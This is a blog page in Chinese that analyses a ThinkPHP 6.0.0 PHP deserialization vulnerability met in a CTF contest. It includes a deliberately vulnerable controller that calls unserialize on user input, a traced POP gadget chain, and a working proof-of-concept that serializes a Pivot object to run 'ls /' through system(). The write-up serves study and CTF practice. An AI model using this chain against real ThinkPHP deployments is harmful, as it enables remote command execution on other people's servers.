@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="description" content="tp6.0.0反序列化漏洞分析"/>
+
+
+
+
+  <meta name="keywords" content="php代码审计," />
+
+
+
+
+
+  <link rel="alternate" href="/default" title="glotozz'blog">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />
+
+
+
+<link rel="canonical" href="https://glotozz.github.io/2019/12/01/tp6-0-0反序列化漏洞分析/"/>
+
+
+<meta property="og:type" content="article">
+<meta property="og:title" content="tp6.0.0反序列化漏洞分析">
+<meta property="og:url" content="https://glotozz.github.io/2019/12/01/tp6-0-0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="glotozz&#39;blog">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2019/12/01/PnD2bkSHlGsC8vI.png">
+<meta property="og:image" content="https://i.loli.net/2019/12/01/xUsHYd7haMSZPX3.png">
+<meta property="og:image" content="https://i.loli.net/2019/12/01/ioYFsMGVyTdCcOp.png">
+<meta property="og:image" content="https://i.loli.net/2019/12/01/RPeXNjJvSqkmu2K.png">
+<meta property="og:image" content="https://i.loli.net/2019/12/01/x5V2COwAWefNgUH.png">
+<meta property="og:image" content="https://i.loli.net/2019/12/01/rxlyShomA8C9GTM.png">
+<meta property="og:image" content="https://i.loli.net/2019/12/01/t36Gu8BDHUk7qac.png">
+<meta property="og:image" content="https://i.loli.net/2019/12/01/fNdW7xEzQBDgn69.png">
+<meta property="og:image" content="https://i.loli.net/2019/12/01/jWZVOyFTgfCsoPd.png">
+<meta property="og:image" content="https://i.loli.net/2019/12/01/KVygiHrbCotTnpB.png">
+<meta property="og:image" content="https://i.loli.net/2019/12/01/OrVszmkb3pARU7Q.png">
+<meta property="og:image" content="https://i.loli.net/2019/12/01/bt9mi7QekTUW1LH.png">
+<meta property="og:image" content="https://i.loli.net/2019/12/01/GuigSYsyCeXU6lw.png">
+<meta property="article:published_time" content="2019-12-01T05:54:22.000Z">
+<meta property="article:modified_time" content="2020-03-28T01:20:57.682Z">
+<meta property="article:author" content="glotozz">
+<meta property="article:tag" content="php代码审计">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2019/12/01/PnD2bkSHlGsC8vI.png">
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
+<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>
+
+
+
+
+
+<script type="text/javascript">
+  var themeConfig = {
+    fancybox: {
+      enable: false
+    },
+  };
+</script>
+
+
+
+
+  
+
+
+<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="http://music.163.com/song/media/outer/url?id=1321392802.mp3"></iframe>--!>
+<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="https://music.163.com/outchain/player?type=2&id=574288806&auto=0&height=66"></iframe>--!>
+    <title> tp6.0.0反序列化漏洞分析 - glotozz'blog </title>
+  <meta name="generator" content="Hexo 4.2.0"></head>
+
+  <body>
+    <div id="page">
+      <header id="masthead"><div class="site-header-inner">
+    <h1 class="site-title">
+        <a href="/." class="logo">glotozz'blog</a>
+    </h1>
+
+    <nav id="nav-top">
+        
+            <ul id="menu-top" class="nav-top-items">
+                
+                    <li class="menu-item">
+                        <a href="/archives">
+                            
+                            
+                                Archives
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/about">
+                            
+                            
+                                About
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/read">
+                            
+                            
+                                Read
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/stars">
+                            
+                            
+                                Stars
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        
+  </nav>
+</div>
+
+      </header>
+      <div id="content">
+        
+    <div id="primary">
+        
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          tp6.0.0反序列化漏洞分析
+        
+      </h1>
+
+      <time class="post-time">
+          Dec 01 2019
+      </time>
+    </header>
+
+
+
+    
+            <div class="post-content">
+            <meta name="referrer" content="no-referrer">
+<a id="more"></a>
+
+<p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>简陋的目录</strong></p>
+<!-- toc -->
+
+<ul>
+<li><a href="#一-获取漏洞">一、获取漏洞</a></li>
+<li><a href="#二-漏洞实现">二、漏洞实现</a></li>
+<li><a href="#三-漏洞分析">三、漏洞分析</a></li>
+<li><a href="#参考链接">参考链接：</a></li>
+</ul>
+<!-- tocstop -->
+
+<hr>
+<p><strong>这次安洵杯考到了这个，当时没时间分析，跟着力哥的blog分析一下，顺便搞清楚力哥的exp为啥是错的😁</strong></p>
+<blockquote>
+<p>toString()魔术方法触发方法，摘自p神知识星球</p>
+<p><img src="https://i.loli.net/2019/12/01/PnD2bkSHlGsC8vI.png" alt="Snipaste_2019-12-01_14-09-04.png"></p>
+</blockquote>
+<h4><span id="一-获取漏洞">一、获取漏洞</span></h4><p><code>tp6.0</code></p>
+<p>修改<code>app/controller/Index.php</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\controller;</span><br><span class="line"></span><br><span class="line">class Index</span><br><span class="line">&#123;</span><br><span class="line">    public function index($input&#x3D;&#39;&#39;)</span><br><span class="line">    &#123;</span><br><span class="line">        echo $input;</span><br><span class="line">        unserialize($input);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4><span id="二-漏洞实现">二、漏洞实现</span></h4><p><img src="https://i.loli.net/2019/12/01/xUsHYd7haMSZPX3.png" alt="Snipaste_2019-12-01_19-32-37.png"></p>
+<h4><span id="三-漏洞分析">三、漏洞分析</span></h4><p><code>tp5.1</code>和<code>tp5.2</code>的漏洞入口都是<code>Windows类</code>的<code>__destruct()</code></p>
+<p><code>tp6</code>全局搜索<code>__destruct()</code>，</p>
+<p><code>vendor/topthink/think-orm/src/Model.php</code></p>
+<p><img src="https://i.loli.net/2019/12/01/ioYFsMGVyTdCcOp.png" alt="Snipaste_2019-12-01_14-22-53.png"></p>
+<p><code>$this-&gt;lazySave</code>可控，追踪<code>save()</code></p>
+<p><img src="https://i.loli.net/2019/12/01/RPeXNjJvSqkmu2K.png" alt="Snipaste_2019-12-01_14-25-08.png"></p>
+<p>其中<code>updateData()</code>可以进一步利用</p>
+<p><img src="https://i.loli.net/2019/12/01/x5V2COwAWefNgUH.png" alt="Snipaste_2019-12-01_14-27-08.png"></p>
+<p>跟进<code>checkAllowFields()</code></p>
+<p><img src="https://i.loli.net/2019/12/01/rxlyShomA8C9GTM.png" alt="Snipaste_2019-12-01_14-28-53.png"></p>
+<p>此处存在字符串拼接，追踪<code>db()</code>也存在字符串拼接</p>
+<p><strong>这里和力哥的代码不太一样，但是不影响</strong></p>
+<p><img src="https://i.loli.net/2019/12/01/t36Gu8BDHUk7qac.png" alt="Snipaste_2019-12-01_14-30-46.png"></p>
+<p>之前提到字符串拼接会触发<code>__toString()</code></p>
+<p>尝试构造，这里直接静态调用<code>db()</code>属性，追踪<code>connect()</code></p>
+<p><img src="https://i.loli.net/2019/12/01/fNdW7xEzQBDgn69.png" alt="Snipaste_2019-12-01_16-56-11.png"></p>
+<p>似乎都没啥限制。。</p>
+<p>整理一下POP链</p>
+<p><code>Model类</code>-&gt;<code>__destruct()</code>-&gt;<code>save()</code>-&gt;<code>updateData()</code>-&gt;<code>checkAllowField()</code>-&gt;<code>toString()</code></p>
+<p>之后就是之前<code>tp5.2</code>的链</p>
+<p> <code>Conversion</code>是<code>trait类型</code>的，不能实例化，通过<code>use</code>来使用，搜索定位到<code>Model类</code>， </p>
+<p><strong>这里挺巧的，最后都是Model类</strong></p>
+<p>直接写exp，在之前<code>tp5.2</code>的基础上修改</p>
+<p><img src="https://i.loli.net/2019/12/01/jWZVOyFTgfCsoPd.png" alt="Snipaste_2019-12-01_19-27-48.png"></p>
+<p>poc</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace think &#123;</span><br><span class="line">    abstract class Model&#123;</span><br><span class="line"></span><br><span class="line">        private $data;</span><br><span class="line">        private $withAttr &#x3D; [];</span><br><span class="line">        private $lazySave &#x3D; true;</span><br><span class="line">        protected $table;</span><br><span class="line">        function __construct($closure,$b&#x3D;&#39;&#39;)</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F; var_dump($closure);</span><br><span class="line">            $this-&gt;data &#x3D; $closure;</span><br><span class="line">            $this-&gt;withAttr &#x3D; [&quot;glotozz&quot;&#x3D;&gt;&#39;system&#39;];</span><br><span class="line">            &#x2F;&#x2F; var_dump($b);</span><br><span class="line">            $this-&gt;name &#x3D; $b;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model &#123;</span><br><span class="line">    class Pivot extends \think\Model&#123;</span><br><span class="line">        function __construct($closure,$b&#x3D;&#39;&#39;)</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F;注意这里不是$b&#x3D;&#39;&#39;</span><br><span class="line">            parent::__construct($closure,$b);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace&#123;</span><br><span class="line">    $pivot &#x3D; new think\model\Pivot([&#39;glotozz&#39;&#x3D;&gt;&#39;ls &#x2F;&#39;]);</span><br><span class="line">    $model &#x3D; new think\model\Pivot([&#39;glotozz&#39;&#x3D;&gt;&#39;ls &#x2F;&#39;],$pivot);</span><br><span class="line">    echo urlencode(serialize($model));</span><br><span class="line">    &#x2F;&#x2F; var_dump($model);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>用xdebug慢慢调，哪里不对改哪里。。通常是未对属性进行修饰🧐</strong></p>
+<p>那么用exp打一下题目试试，没啥结果。。。</p>
+<p><img src="https://i.loli.net/2019/12/01/KVygiHrbCotTnpB.png" alt="Snipaste_2019-12-01_19-47-17.png"></p>
+<p>我本地搭建了一下并调试</p>
+<p><img src="https://i.loli.net/2019/12/01/OrVszmkb3pARU7Q.png" alt="Snipaste_2019-12-01_20-00-03.png"></p>
+<p>发现原来是出题人偷偷把这里改了。。。那么我只需要把<code>name</code>变量改成<code>table</code>即可</p>
+<p><img src="https://i.loli.net/2019/12/01/bt9mi7QekTUW1LH.png" alt="Snipaste_2019-12-01_20-01-52.png"></p>
+<hr>
+<p>简单调试下力哥的exp，目前已知的是源码有点不同，</p>
+<p><img src="https://i.loli.net/2019/12/01/GuigSYsyCeXU6lw.png" alt="Snipaste_2019-12-01_21-04-41.png"></p>
+<p>是这里直接<code>exit()</code>了。。。</p>
+<h4><span id="参考链接">参考链接：</span></h4><p> <a href="https://zhzhdoai.github.io/2019/10/02/ThinkPHP-6-0-x反序列化/#前言" target="_blank" rel="noopener">https://zhzhdoai.github.io/2019/10/02/ThinkPHP-6-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E5%89%8D%E8%A8%80</a></p>
+
+            </div>
+          
+
+    
+      <footer class="post-footer">
+
+        
+         <div>    
+          
+          <ul class="post-copyright">
+             <li class="post-copyright-link">
+              <strong>本文作者：</strong>
+              <a href="/" title="欢迎访问 glotozz 的个人博客">glotozz</a>
+            </li>
+
+            <li class="post-copyright-license">
+              <strong>版权声明： </strong>
+               本博客所有文章除特别声明外，均采用 CC BY-NC-SA 4.0 许可协议。转载请注明出处！
+            </li>
+          </ul>
+        
+      </div>
+      
+        <div class="post-tags">
+          
+            <a href="/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag"><i class="fa fa-tag"></i> php代码审计</a>
+          
+        </div>
+      
+
+        
+        
+  <nav class="post-nav">
+    
+      <a class="prev" href="/2020/02/20/start/">
+        <i class="iconfont icon-left"></i>
+        <span class="prev-text nav-default">New Start</span>
+        <span class="prev-text nav-mobile">Prev</span>
+      </a>
+    
+    
+      <a class="next" href="/2019/11/24/LFIToRCE%E6%80%9D%E8%B7%AF/">
+        <span class="next-text nav-default">LFIToRCE思路</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    
+  </nav>
+
+        
+  <div class="comments" id="comments">
+    
+      <div id="vcomments"></div>
+    
+  </div>
+
+
+      </footer>
+    
+  </article>
+
+    </div>
+
+      </div>
+
+      <footer id="colophon">
+<span class="copyright-year">
+    
+        &copy;
+    
+    2020
+    <span class="footer-author">glotozz.</span>
+    <span class="power-by">
+        Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear" target="_blank" rel="noopener">Polar Bear</a>
+    </span>
+</span>
+
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+    
+
+
+
+  
+<!-- valine Comments -->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/xcss/valine@v1.1.7/dist/Valine.min.js"></script>
+<script type="text/javascript">
+    new Valine({
+        el: '#vcomments',
+        notify: false,
+        verify: false,
+        app_id: "d2XJ52o9D5xTnDd2J92VPPna-gzGzoHsz",
+        app_key: "P6wHC0f6Fn02hW8SSdnax8wa",
+        placeholder: "Just go go",
+        avatar: 'mm'
+    });
+</script>
+
+
+    
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+
+    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>
+
+    <!-- 代码块复制功能 -->
+  <script type="text/javascript" src="/js/src/clipboard.min.js"></script>  
+  <script type="text/javascript" src="/js/src/clipboard-use.js"></script>
+  </body>
+</html>
